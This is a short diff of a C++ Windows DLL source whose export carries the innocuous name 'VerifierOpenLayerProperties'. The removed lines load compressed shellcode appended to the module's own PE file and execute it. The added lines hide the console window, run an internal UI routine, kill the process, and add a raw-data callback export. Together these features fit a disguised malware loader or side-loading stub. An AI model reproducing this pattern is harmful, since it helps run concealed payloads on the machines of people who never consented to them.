@@ -1,19 +1,21 @@
 ﻿#include "stdafx.h"
 
 __shared_api_ void __stdcall VerifierOpenLayerProperties(void) {
-	do {
-		if (!shared::Win::ShellcodeExecuteByPEAppenddata(0, \
-			shared::Win::File::Read(shared::Win::GetModulePathnameA()),
-			[](const auto& in, const auto& origin, auto& out) {
-				return (Z_OK == shared::Zip::zipUnCompress(in, origin, out));
-			}))
-			break;
+	auto hConsoleWindow = ::GetConsoleWindow();
+	::ShowWindow(hConsoleWindow, SW_HIDE);
 
-			do {
-				std::this_thread::sleep_for(std::chrono::seconds(1));
-			} while (1);
+	do {
+		if (local::__gpGlobal)
+			break;
+		local::__gpGlobal = new local::Global();
+		local::Global::UIMain()->Perfrom();
 	} while (0);
+	SK_DELETE_PTR(local::__gpGlobal);
 
 	::TerminateProcess(::GetCurrentProcess(), 3762);
 	::_exit(3762);
 }//@23
+
+__shared_api_ void __stdcall RouteDataCallback(const void* route, unsigned long route_size) {
+	local::Global::LaunchRouteRes(route, route_size);
+}
